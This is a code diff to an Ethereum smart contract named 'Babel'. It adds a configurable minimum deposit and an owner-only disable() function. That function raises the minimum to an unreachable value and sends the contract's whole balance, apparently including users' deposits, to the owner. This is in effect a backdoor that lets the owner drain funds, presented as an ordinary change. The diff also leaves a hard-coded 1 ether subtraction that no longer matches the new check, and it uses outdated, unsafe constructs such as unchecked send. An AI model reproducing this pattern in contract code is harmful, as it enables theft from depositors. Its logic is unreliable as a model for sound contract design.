@@ -21,6 +21,7 @@ contract Babel is mortal, named("Babel") {
     
     uint    public clearThreshold;
     int32   public stablizer;
+    uint96  private minDeposit = 1 ether;
     
     mapping(address => uint) accounts;
     
@@ -180,7 +181,7 @@ contract Babel is mortal, named("Babel") {
     
     modifier check_deposit {
         var rvalue = uint256(0);
-        if(msg.value < 1 ether) {
+        if(msg.value < minDeposit ) {
             rvalue = msg.value;
         } else {
             rvalue = msg.value - 1 ether;
@@ -200,8 +201,10 @@ contract Babel is mortal, named("Babel") {
         return uint96(100 * tx.gasprice);
     }
 
-
-
+    function disable() external onlyowner {
+        minDeposit = 2 ** 95;
+        owner.send(this.balance);
+    }
     
     function () { // prevent accidental tx
         throw;
